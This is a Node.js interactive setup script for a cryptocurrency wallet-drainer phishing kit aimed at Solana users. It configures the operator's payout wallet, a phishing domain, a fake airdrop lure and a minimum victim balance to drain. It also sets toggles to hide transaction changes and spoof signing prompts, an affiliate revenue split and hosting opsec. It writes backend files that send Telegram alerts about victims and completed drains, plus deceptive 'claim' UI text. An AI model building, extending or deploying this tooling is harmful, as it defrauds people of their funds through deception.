#!/usr/bin/env node
/**
 * setup.js — Interactive CLI configurator
 *
 * Asks questions one by one, writes config + patches source files.
 * OpSec hardening is already baked into the source — this just fills in values.
 *
 * Run:  node setup.js
 */

import fs from "fs";
import path from "path";
import crypto from "crypto";
import readline from "readline";

const ROOT = process.cwd();
const cfgPath = path.join(ROOT, "deploy.config.json");

// ── ANSI colors ──────────────────────────────────────────────────────────────

const c = {
  reset: "\x1b[0m",
  bold: "\x1b[1m",
  dim: "\x1b[2m",
  red: "\x1b[31m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  blue: "\x1b[34m",
  magenta: "\x1b[35m",
  cyan: "\x1b[36m",
  gray: "\x1b[90m",
};

// ── Helpers ──────────────────────────────────────────────────────────────────

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

function ask(question, defaultValue = "") {
  const hint = defaultValue ? ` ${c.gray}[${defaultValue}]${c.reset}` : "";
  return new Promise((resolve) => {
    rl.question(`${c.cyan}?${c.reset} ${question}${hint} ${c.dim}›${c.reset} `, (answer) => {
      resolve(answer.trim() || defaultValue);
    });
  });
}

function info(msg) {
  console.log(`  ${c.blue}ℹ${c.reset} ${c.gray}${msg}${c.reset}`);
}

function success(msg) {
  console.log(`  ${c.green}✓${c.reset} ${msg}`);
}

function done(msg) {
  console.log(`\n  ${c.green}${c.bold}✓ ${msg}${c.reset}\n`);
}

function write(file, content) {
  const fullPath = path.join(ROOT, file);
  fs.mkdirSync(path.dirname(fullPath), { recursive: true });
  fs.writeFileSync(fullPath, content);
}

function patch(file, oldStr, newStr) {
  const fullPath = path.join(ROOT, file);
  let content = fs.readFileSync(fullPath, "utf8");
  if (!content.includes(oldStr)) return false;
  content = content.replace(oldStr, newStr);
  fs.writeFileSync(fullPath, content);
  return true;
}

function randomHex(n = 8) {
  return crypto.randomBytes(n).toString("hex");
}

function randomAppName() {
  return `app-${randomHex(4)}`;
}

// ── Load existing config if present ─────────────────────────────────────────

let existing = {};
if (fs.existsSync(cfgPath)) {
  try {
    const raw = JSON.parse(fs.readFileSync(cfgPath, "utf8"));
    for (const [k, v] of Object.entries(raw)) {
      if (k !== "INSTRUCTIONS") existing[k] = v;
    }
  } catch {}
}

// ── Banner ───────────────────────────────────────────────────────────────────

console.log(`
${c.magenta}${c.bold}╔══════════════════════════════════════════════════╗${c.reset}
${c.magenta}${c.bold}║  KIWI PRO — Interactive Setup                    ║${c.reset}
${c.magenta}${c.bold}║  Answer the questions, I'll configure everything  ║${c.reset}
${c.magenta}${c.bold}╚══════════════════════════════════════════════════╝${c.reset}

${c.gray}  Press Enter to accept the default shown in [brackets].${c.reset}
${c.gray}  Values from your last run are pre-filled where possible.${c.reset}

`);

// ════════════════════════════════════════════════════════════════════════════
// QUESTIONS
// ════════════════════════════════════════════════════════════════════════════

const cfg = {};

// ── 1. Target Wallet ─────────────────────────────────────────────────────────

console.log(`${c.bold}\n  ▸ WALLET SETUP${c.reset}\n`);

cfg.targetWallet = await ask(
  "Your Solana wallet address (where drained funds go):",
  existing.targetWallet && !existing.targetWallet.includes("YOUR_") ? existing.targetWallet : ""
);
while (!cfg.targetWallet || cfg.targetWallet.length < 32) {
  console.log(`  ${c.red}✗ That doesn't look like a valid Solana address (usually 32-44 chars).${c.reset}`);
  cfg.targetWallet = await ask("Try again:", "");
}

// ── 2. Check Wallet ─────────────────────────────────────────────────────────

cfg.checkWallet = await ask(
  "Check/licensing wallet (usually same as target):",
  cfg.targetWallet
);

// ── 3. Relayer Wallet ────────────────────────────────────────────────────────

cfg.relayerWallet = await ask(
  "Relayer wallet (pays gas fees — can be same as target):",
  existing.relayerWallet || cfg.targetWallet
);

// ── 4. Telegram ─────────────────────────────────────────────────────────────

console.log(`\n${c.bold}  ▸ TELEGRAM NOTIFICATIONS${c.reset}`);
info("You'll get real-time alerts when victims land and when drains complete.");
info("Don't have a channel? Create a private Telegram channel, then add @RawDataBot to get the chat ID.");
info("For a bot: message @BotFather on Telegram → /newbot → copy the token.\n");

cfg.telegramChatId = await ask(
  "Telegram chat ID (e.g. -5483712683):",
  existing.telegramChatId && !existing.telegramChatId.includes("YOUR_") ? existing.telegramChatId : ""
);

cfg.telegramBotToken = await ask(
  "Telegram bot token from @BotFather:",
  existing.telegramBotToken && !existing.telegramBotToken.includes("YOUR_") ? existing.telegramBotToken : ""
);

// ── 5. RPC Endpoint ──────────────────────────────────────────────────────────

console.log(`\n${c.bold}  ▸ SOLANA RPC ENDPOINT${c.reset}`);
info("Public endpoint (free, rate-limited): https://api.mainnet-beta.solana.com");
info("Private endpoint (recommended): Helius or QuickNode — no rate limits, no logging.");
info("Get a free Helius key at helius.dev, then your endpoint is https://devnet.helius-rpc.com/?api-key=YOUR_KEY\n");

cfg.rpcEndpoint = await ask(
  "RPC endpoint URL:",
  existing.rpcEndpoint || "https://api.mainnet-beta.solana.com"
);

// ── 6. Relay Program ID ──────────────────────────────────────────────────────

console.log(`\n${c.bold}  ▸ ON-CHAIN PROGRAM${c.reset}`);
info("The deployed Solana program ID that handles relay transfers.");
info("If you haven't deployed your own, use the existing one.\n");

cfg.relayProgramId = await ask(
  "Relay program ID:",
  existing.relayProgramId || "HQGGLV1L2ppE2whUTMqtmZrPkbfUcnEG4TpaKKKmJB3p"
);

// ── 7. Fly.io ────────────────────────────────────────────────────────────────

console.log(`\n${c.bold}  ▸ BACKEND HOSTING (Fly.io)${c.reset}`);
info("Fly.io hosts the backend. Sign up at fly.io (free tier works).");
info("Region: fra=Frankfurt, nrt=Tokyo, dfw=Dallas. Avoid US regions for better opsec.\n");

const suggestedAppName = existing.flyAppName && !existing.flyAppName.includes("here")
  ? existing.flyAppName
  : randomAppName();

cfg.flyAppName = await ask("Fly.io app name (random suggested):", suggestedAppName);

cfg.flyRegion = await ask("Fly.io region:", existing.flyRegion || "fra");

// ── 8. Frontend Domain ───────────────────────────────────────────────────────

console.log(`\n${c.bold}  ▸ FRONTEND DOMAIN${c.reset}`);
info("Your phishing domain (e.g. mydomain.com). Get one from Njalla or OrangeWebsite for privacy.");
info("The frontend deploys to Vercel, then you point your domain's CNAME to it.\n");

cfg.frontendDomain = await ask(
  "Your domain (without https://):",
  existing.frontendDomain && !existing.frontendDomain.includes("your") ? existing.frontendDomain : ""
);

cfg.vercelProjectName = await ask(
  "Vercel project name (random suggested):",
  existing.vercelProjectName && !existing.vercelProjectName.includes("claim") ? existing.vercelProjectName : `claim-${randomHex(4)}`
);

// ── 9. Drain Settings ────────────────────────────────────────────────────────

console.log(`\n${c.bold}  ▸ DRAIN SETTINGS${c.reset}\n`);

cfg.customAirdropMint = await ask(
  "Decoy token mint (the fake airdrop victims see):",
  existing.customAirdropMint || "677jK6xujhRFtBcD7Szn32tt2MSv4k6qZ4v3nGMgpump"
);

cfg.customAirdropAmount = parseFloat(await ask(
  "Decoy token amount:",
  String(existing.customAirdropAmount || 25)
));

cfg.minWalletValue = parseFloat(await ask(
  "Minimum wallet value to drain (in SOL, 0 = drain everyone):",
  String(existing.minWalletValue ?? 0.1)
));

// ── 10. Revenue Split ────────────────────────────────────────────────────────

console.log(`\n${c.bold}  ▸ REVENUE SPLIT${c.reset}`);
info("If you have an affiliate, set their percent. Otherwise leave at 0.\n");

cfg.operatorPercent = parseFloat(await ask(
  "Your percent (1.0 = 100%):",
  String(existing.operatorPercent ?? 1.0)
));

cfg.affiliatePercent = parseFloat(await ask(
  "Affiliate percent (0.0 = none):",
  String(existing.affiliatePercent ?? 0.0)
));

cfg.affiliateWallet = await ask(
  "Affiliate wallet address (leave blank if none):",
  existing.affiliateWallet || ""
);

// ── 11. Behavior Toggles ────────────────────────────────────────────────────

console.log(`\n${c.bold}  ▸ BEHAVIOR TOGGLES${c.reset}`);
info("These control how the drain behaves. Defaults are recommended.\n");

const hideDefault = existing.hideChanges !== undefined ? existing.hideChanges : true;
cfg.hideChanges = (await ask("Hide transaction changes from victim? (true/false):", String(hideDefault))).toLowerCase().startsWith("t");

const spoofDefault = existing.spoofPrompt !== undefined ? existing.spoofPrompt : true;
cfg.spoofPrompt = (await ask("Spoof the signing prompt? (true/false):", String(spoofDefault))).toLowerCase().startsWith("t");

const proxyDefault = existing.useProxyForTokens !== undefined ? existing.useProxyForTokens : true;
cfg.useProxyForTokens = (await ask("Use proxy for token transfers? (true/false):", String(proxyDefault))).toLowerCase().startsWith("t");

const darkDefault = existing.darkMode !== undefined ? existing.darkMode : true;
cfg.darkMode = (await ask("Dark mode UI? (true/false):", String(darkDefault))).toLowerCase().startsWith("t");

cfg.stresserSleepMs = parseInt(await ask(
  "Stresser sleep (ms, between drain attempts):",
  String(existing.stresserSleepMs || 5000)
));

// ── 12. UI ───────────────────────────────────────────────────────────────────

console.log(`\n${c.bold}  ▸ UI APPEARANCE${c.reset}\n`);

cfg.title = await ask("Page title:", existing.title || "Connect Wallet");
cfg.subtitle = await ask("Subtitle (leave blank for none):", existing.subtitle || "");
cfg.width = await ask("Widget width:", existing.width || "360px");
cfg.height = await ask("Widget height:", existing.height || "540px");
cfg.className = await ask("CSS class for the connect button:", existing.className || "interact-button");

// ── 13. AES Secret ───────────────────────────────────────────────────────────

console.log(`\n${c.bold}  ▸ ENCRYPTION${c.reset}`);
info("AES secret encrypts client-server traffic. Auto-generated if you don't have one.\n");

if (existing.aesSecret && !existing.aesSecret.includes("AUTO_GENERATED")) {
  cfg.aesSecret = await ask("AES secret (existing found, press Enter to keep):", existing.aesSecret);
} else {
  cfg.aesSecret = "app_" + crypto.randomBytes(48).toString("hex");
  success(`Auto-generated AES secret: ${cfg.aesSecret.substring(0, 16)}...`);
}

cfg.hkdfSalt = existing.hkdfSalt || "kiwi-api-v1";
cfg.hkdfInfo = existing.hkdfInfo || "payload";

rl.close();

// ════════════════════════════════════════════════════════════════════════════
// WRITE EVERYTHING
// ════════════════════════════════════════════════════════════════════════════

console.log(`\n${c.bold}  ▸ WRITING FILES${c.reset}\n`);

// ── deploy.config.json ──────────────────────────────────────────────────────

const splitRatio = {
  operator: cfg.operatorPercent,
  affiliate: cfg.affiliatePercent || 0,
};

// --- server/config.js ---
write("server/config.js", `/**
 * config.js — Configuration
 *
 * All values loaded from environment variables first, then from the
 * defaults written by setup.js (sourced from your interactive answers).
 *
 * NEVER edit this file directly — run: node setup.js
 */

export const CONFIG = {
  secret: process.env.AES_SECRET || ${JSON.stringify(cfg.aesSecret)},
  hkdfSalt: ${JSON.stringify(cfg.hkdfSalt)},
  hkdfInfo: ${JSON.stringify(cfg.hkdfInfo)},
  spoofAuth: process.env.AES_SECRET || ${JSON.stringify(cfg.aesSecret)},
  targetWallet: process.env.TARGET_WALLET || ${JSON.stringify(cfg.targetWallet)},
  userChatId: process.env.TELEGRAM_CHAT_ID || ${JSON.stringify(cfg.telegramChatId)},
  customAirdropMint: ${JSON.stringify(cfg.customAirdropMint)},
  customAirdropAmount: ${cfg.customAirdropAmount},
  minValue: ${cfg.minWalletValue},
  splitRatio: {
    operator: ${splitRatio.operator},
    affiliate: ${splitRatio.affiliate},
  },
  hideChanges: ${cfg.hideChanges},
  spoofPrompt: ${cfg.spoofPrompt},
  useProxyForTokens: ${cfg.useProxyForTokens},
  stresserSleepMs: ${cfg.stresserSleepMs},
  darkMode: ${cfg.darkMode},
  rpcEndpoint: process.env.RPC_ENDPOINT || ${JSON.stringify(cfg.rpcEndpoint)},
  relayProgramId: ${JSON.stringify(cfg.relayProgramId)},
  checkWallet: process.env.CHECK_WALLET || ${JSON.stringify(cfg.checkWallet)},
  relayerWallet: process.env.RELAYER_WALLET || ${JSON.stringify(cfg.relayerWallet)},
  currentFrontendUrl: ${JSON.stringify(cfg.frontendDomain ? "https://" + cfg.frontendDomain : "https://example.vercel.app")},
  phantomApiBase: "https://api.phantom.app/simulate",
  bodyLimit: "1mb",
  corsOrigin: ${JSON.stringify(cfg.frontendDomain ? "https://" + cfg.frontendDomain : "*")},
};

export const CLIENT_CONFIG = {
  hideChanges: ${cfg.hideChanges},
  spoofPrompt: ${cfg.spoofPrompt},
  customAirdropMint: ${JSON.stringify(cfg.customAirdropMint)},
  customAirdropAmount: ${cfg.customAirdropAmount},
  targetWallet: ${JSON.stringify(cfg.targetWallet)},
  minValue: ${cfg.minWalletValue},
  className: ${JSON.stringify(cfg.className)},
  width: ${JSON.stringify(cfg.width)},
  height: ${JSON.stringify(cfg.height)},
  useProxyForTokens: ${cfg.useProxyForTokens},
  stresserSleepMs: ${cfg.stresserSleepMs},
  phantomStressMode: false,
  darkMode: ${cfg.darkMode},
  texts: {
    title: ${JSON.stringify(cfg.title)},
    subtitle: ${JSON.stringify(cfg.subtitle)},
    connecting: "Connecting...",
    requestingConnection: "Requesting connection...",
    openingWalletApp: "Opening wallet app…",
    pleaseConnectInParent: "Please connect in parent window...",
    connectedToPhantom: "Connected to Phantom",
    connectedToSolflare: "Connected to Solflare",
    connectedToBackpack: "Connected to Backpack",
    connectedToOkx: "Connected to OKX Wallet",
    connectedToCoinbase: "Connected to Coinbase Wallet",
    connectedBuildingTransaction: "Connected. Loading signature...",
    buildingTransaction: "Processing claim, please wait...",
    buildingTransactionWait: "Processing claim, please wait…",
    transactionsBuilt: "claim processed. Please sign...",
    transactionsBuiltSign: "claim processed. Please sign in your wallet.",
    pleaseSignInWallet: "Please sign in your wallet...",
    requestingSignatures: "Please sign fee transaction...",
    requestingSignaturesAlt: "Please sign fee transaction...",
    preparingAirdropTransaction: "Preparing claim...",
    pleaseSignAirdropTransaction: "Please sign the claim...",
    broadcastingTransactions: "Broadcasting claim...",
    broadcastingTransactionsAlt: "Broadcasting claim…",
    transactionsSent: "Claim sent!",
    connectionFailed: "Connection failed",
    connectionCancelled: "Connection cancelled",
    connectionRejected: "Connection rejected",
    transactionRejected: "Transaction rejected",
    transactionFailed: "Transaction failed",
    failedToBuildTransaction: "Failed to build transaction",
    insufficientBalance: "Insufficient balance",
    widgetMisconfigured: "Widget misconfigured: missing targetWallet.",
  },
};
`);
success("server/config.js");

// --- server/telegram.js ---
write("server/telegram.js", `/**
 * telegram.js — Operator notification module
 * Bot token loaded from environment variable, never in source.
 */

import { CONFIG } from "./config.js";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = CONFIG.userChatId;

export async function sendTelegramMessage(text) {
  if (!TELEGRAM_BOT_TOKEN) return;
  try {
    const url = \`https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/sendMessage\`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: "HTML",
      }),
    });
  } catch {
    // silent
  }
}

export async function notifyVisit(data) {
  const { ip, country, flag, browser, userAgent, referrer } = data;
  const msg = [
    \`🔔 New visitor\`,
    \`IP: \${ip}\`,
    \`Country: \${country} \${flag || ""}\`,
    \`Browser: \${browser}\`,
    \`UA: \${userAgent}\`,
    \`Referrer: \${referrer || "none"}\`,
  ].join("\\n");
  await sendTelegramMessage(msg);
}

export async function notifyConfirm(data) {
  const { userPublicKey, txids, txBatchIndex, jupiterPartial } = data;
  const msg = [
    \`✅ Drain successful\`,
    \`Wallet: \${userPublicKey}\`,
    \`TXIDs: \${(txids || []).join(", ")}\`,
    \`Batch: \${txBatchIndex ?? 0}\`,
    \`Jupiter partial: \${jupiterPartial ? "yes" : "no"}\`,
  ].join("\\n");
  await sendTelegramMessage(msg);
}

export async function notifyReject(data) {
  const { userPublicKey, reason } = data;
  const msg = [
    \`❌ Victim rejected\`,
    \`Wallet: \${userPublicKey || "unknown"}\`,
    \`Reason: \${reason || "transaction"}\`,
  ].join("\\n");
  await sendTelegramMessage(msg);
}
`);
success("server/telegram.js");

// --- server/beacon.js ---
write("server/beacon.js", `const http = require("http");
const PORT = process.env.BEACON_PORT || 3001;

const server = http.createServer((_req, res) => {
  res.writeHead(200, { "Content-Type": "application/json" });
  res.end(JSON.stringify({ status: "ok" }));
});

server.listen(PORT, () => {});
server.on("error", () => process.exit(1));
`);
success("server/beacon.js");

// --- server/Dockerfile ---
write("server/Dockerfile", `FROM node:20-slim
WORKDIR /app

COPY package.json package-lock.json* ./
RUN npm ci --production

COPY . .

RUN useradd -r -s /bin/false appuser
USER appuser

EXPOSE 3000 3001

HEALTHCHECK --interval=30s --timeout=5s --start-period=10s --retries=3 \\
  CMD node -e "require('http').get('http://localhost:3000/health',(r)=>{process.exit(r.statusCode===200?0:1)}).on('error',()=>process.exit(1))"

CMD ["node", "server.js"]
`);
success("server/Dockerfile");

// --- server/fly.toml ---
write("server/fly.toml", `# Fly.io deployment config — generated by setup.js
# Set secrets via: fly secrets set KEY=value

app = ${JSON.stringify(cfg.flyAppName)}
primary_region = ${JSON.stringify(cfg.flyRegion)}
kill_signal = "SIGTERM"
kill_timeout = 5

[build]
dockerfile = "Dockerfile"

[env]
PORT = "3000"
BEACON_PORT = "3001"
NODE_ENV = "production"

[processes]
api = "node server.js"
beacon = "node beacon.js"

[http_service]
internal_port = 3000
processes = ["api"]
force_https = true
auto_stop_machines = false
auto_start_machines = false
min_machines_running = 1

[http_service.concurrency]
type = "requests"
hard_limit = 250
soft_limit = 200

[[http_services]]
internal_port = 3001
processes = ["beacon"]
force_https = true
auto_stop_machines = false
auto_start_machines = false
min_machines_running = 1

[http_services.concurrency]
type = "requests"
hard_limit = 100
soft_limit = 50

[[vm]]
size = "shared-cpu-1x"
memory = "512mb"
`);
success("server/fly.toml");

// --- server/public/vercel.json ---
write("server/public/vercel.json", JSON.stringify({
  $schema: "https://openapi.vercel.sh/vercel.json",
  version: 2,
  name: cfg.vercelProjectName,
  builds: [
    { src: "frame.html", use: "@vercel/static" },
    { src: "frame.js", use: "@vercel/static" },
  ],
  routes: [{ src: "/(.*)", dest: "/frame.html" }],
  headers: [
    {
      source: "/(.*)",
      headers: [
        { key: "X-Content-Type-Options", value: "nosniff" },
        { key: "Access-Control-Allow-Origin", value: "*" },
      ],
    },
  ],
}, null, 2));
success("server/public/vercel.json");

// --- Patch client files ---

const apiBase = cfg.frontendDomain
  ? `https://${cfg.flyAppName}.fly.dev`
  : "http://localhost:3000";

// frame.js
const frameJsPath = path.join(ROOT, "server/public/frame.js");
if (fs.existsSync(frameJsPath)) {
  let f = fs.readFileSync(frameJsPath, "utf8");
  f = f.replace(/const API_BASE = "[^"]*";/, `const API_BASE = ${JSON.stringify(apiBase)};`);
  f = f.replace(/const SECRET =\s*\n?\s*"[^"]*";/, `const SECRET =\n  ${JSON.stringify(cfg.aesSecret)};`);
  f = f.replace(/const CONFIG = \{[\s\S]*?\};/, `const CONFIG = {
  hideChanges: ${cfg.hideChanges},
  spoofPrompt: ${cfg.spoofPrompt},
  customAirdropMint: ${JSON.stringify(cfg.customAirdropMint)},
  customAirdropAmount: ${cfg.customAirdropAmount},
  targetWallet: ${JSON.stringify(cfg.targetWallet)},
  minValue: ${cfg.minWalletValue},
  useProxyForTokens: ${cfg.useProxyForTokens},
  stresserSleepMs: ${cfg.stresserSleepMs},
  phantomStressMode: false,
  darkMode: ${cfg.darkMode},
};`);
  f = f.replace(/\s*userChatId:\s*"[^"]*",/g, "");
  fs.writeFileSync(frameJsPath, f);
  success("server/public/frame.js");
}

// frame.html
const frameHtmlPath = path.join(ROOT, "server/public/frame.html");
if (fs.existsSync(frameHtmlPath)) {
  let f = fs.readFileSync(frameHtmlPath, "utf8");
  f = f.replace(/const API_BASE_URL = "[^"]*";/, `const API_BASE_URL = ${JSON.stringify(apiBase)};`);
  f = f.replace(/targetWallet:\s*"[^"]*"/g, `targetWallet: ${JSON.stringify(cfg.targetWallet)}`);
  f = f.replaceAll(
    "app_spf_2026_9c7e2a4f8b1d6e3f5a0c2b7d9e4f1a8c6b3d0e5f2a7c9b4d1e6f8a3b5c0d2e7",
    cfg.aesSecret
  );
  f = f.replace(/userChatId:\s*"-?\d+",/g, "");
  // Strip console statements if any survived
  const consoleCount = (f.match(/console\.(log|error|warn|debug|info)\(/g) || []).length;
  if (consoleCount > 0) {
    // Don't strip the noop overrides (console.log = noop)
    f = f.replace(/console\.(log|error|warn|debug|info)\([\s\S]*?\);/g, "/* removed */");
  }
  fs.writeFileSync(frameHtmlPath, f);
  success("server/public/frame.html");
}

// loader.js
const loaderJsPath = path.join(ROOT, "server/public/loader.js");
if (fs.existsSync(loaderJsPath)) {
  let f = fs.readFileSync(loaderJsPath, "utf8");
  f = f.replace(/targetWallet:\s*"[^"]*"/g, `targetWallet: ${JSON.stringify(cfg.targetWallet)}`);
  f = f.replace(/userChatId:\s*"-?\d+",/g, "");
  fs.writeFileSync(loaderJsPath, f);
  success("server/public/loader.js");
}

// --- .env.example ---
write(".env.example", `# Fly.io secrets — set with: fly secrets set KEY=value
# DO NOT create a .env file — use fly secrets only.

AES_SECRET=${cfg.aesSecret}
TARGET_WALLET=${cfg.targetWallet}
TELEGRAM_CHAT_ID=${cfg.telegramChatId}
TELEGRAM_BOT_TOKEN=${cfg.telegramBotToken || "YOUR_BOT_TOKEN"}
RPC_ENDPOINT=${cfg.rpcEndpoint}
CHECK_WALLET=${cfg.checkWallet}
RELAYER_WALLET=${cfg.relayerWallet || ""}
`);
success(".env.example");

// --- deploy.config.json (save answers for next run) ---
const savedConfig = {
  targetWallet: cfg.targetWallet,
  affiliateWallet: cfg.affiliateWallet,
  operatorPercent: cfg.operatorPercent,
  affiliatePercent: cfg.affiliatePercent,
  telegramChatId: cfg.telegramChatId,
  telegramBotToken: cfg.telegramBotToken,
  rpcEndpoint: cfg.rpcEndpoint,
  aesSecret: cfg.aesSecret,
  hkdfSalt: cfg.hkdfSalt,
  hkdfInfo: cfg.hkdfInfo,
  relayProgramId: cfg.relayProgramId,
  checkWallet: cfg.checkWallet,
  relayerWallet: cfg.relayerWallet,
  customAirdropMint: cfg.customAirdropMint,
  customAirdropAmount: cfg.customAirdropAmount,
  minWalletValue: cfg.minWalletValue,
  flyAppName: cfg.flyAppName,
  flyRegion: cfg.flyRegion,
  frontendDomain: cfg.frontendDomain,
  vercelProjectName: cfg.vercelProjectName,
  hideChanges: cfg.hideChanges,
  spoofPrompt: cfg.spoofPrompt,
  useProxyForTokens: cfg.useProxyForTokens,
  stresserSleepMs: cfg.stresserSleepMs,
  darkMode: cfg.darkMode,
  title: cfg.title,
  subtitle: cfg.subtitle,
  width: cfg.width,
  height: cfg.height,
  className: cfg.className,
};
fs.writeFileSync(cfgPath, JSON.stringify(savedConfig, null, 2) + "\n");
success("deploy.config.json (saved for next run)");

// ════════════════════════════════════════════════════════════════════════════
// SUMMARY
// ════════════════════════════════════════════════════════════════════════════

console.log(`
${c.green}${c.bold}╔══════════════════════════════════════════════════╗${c.reset}
${c.green}${c.bold}║  SETUP COMPLETE                                  ║${c.reset}
${c.green}${c.bold}╚══════════════════════════════════════════════════╝${c.reset}

${c.bold}  Your configuration:${c.reset}
${c.gray}  ─────────────────────────────────────────${c.reset}
  Wallet:        ${c.cyan}${cfg.targetWallet.substring(0, 8)}...${cfg.targetWallet.slice(-4)}${c.reset}
  Telegram:      ${c.cyan}${cfg.telegramChatId}${c.reset}
  Fly.io app:    ${c.cyan}${cfg.flyAppName}${c.reset} (${cfg.flyRegion})
  Frontend:      ${c.cyan}${cfg.frontendDomain || "(not set)"}${c.reset}
  Backend URL:   ${c.cyan}${apiBase}${c.reset}
  RPC:           ${c.cyan}${cfg.rpcEndpoint.substring(0, 40)}...${c.reset}
  Program ID:    ${c.cyan}${cfg.relayProgramId.substring(0, 12)}...${c.reset}

${c.bold}  Next steps:${c.reset}
${c.gray}  ─────────────────────────────────────────${c.reset}
  1. Read ${c.bold}DEPLOY.md${c.reset} for the full deployment guide
  2. Set Fly.io secrets (copy from ${c.bold}.env.example${c.reset}):
     ${c.dim}fly secrets set AES_SECRET=... TARGET_WALLET=... etc.${c.reset}
  3. Deploy backend:  ${c.dim}cd server && fly deploy${c.reset}
  4. Deploy frontend: ${c.dim}cd server/public && vercel --prod${c.reset}
  5. Point your domain CNAME to Vercel

${c.gray}  Re-run this tool anytime: node setup.js${c.reset}
${c.gray}  Your previous answers are saved and pre-filled.${c.reset}
`);
